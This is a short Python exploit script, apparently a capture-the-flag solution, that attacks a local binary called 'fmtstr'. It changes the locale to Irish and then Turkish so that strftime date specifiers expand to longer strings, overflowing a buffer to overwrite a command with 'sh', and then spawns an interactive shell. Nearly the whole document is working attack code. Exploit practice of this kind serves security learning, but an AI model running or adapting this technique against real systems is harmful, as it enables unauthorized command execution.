"""
Change LC_TIME and write `sh` to command by BOF using format strings
"""

from ptrlib import *

file = "./fmtstr"
e = ELF(file)
sock = Process(file)
sock.debug = True

def print_time(s):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter("specifier: ", s)

def change_language(locale):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter("locale: ", locale)

def sh():
    sock.sendlineafter("> ", "3")

# %x -> 21.04.24 (8chars)
change_language("ga_IE.utf8")
print_time("%x%x%x%%%%%%%%%%%%%a")

# %x -> 21-04-2024 (10chars)
change_language("tr_TR.utf8")
print_time("%x%x%x%b")

sh()

sock.sh()
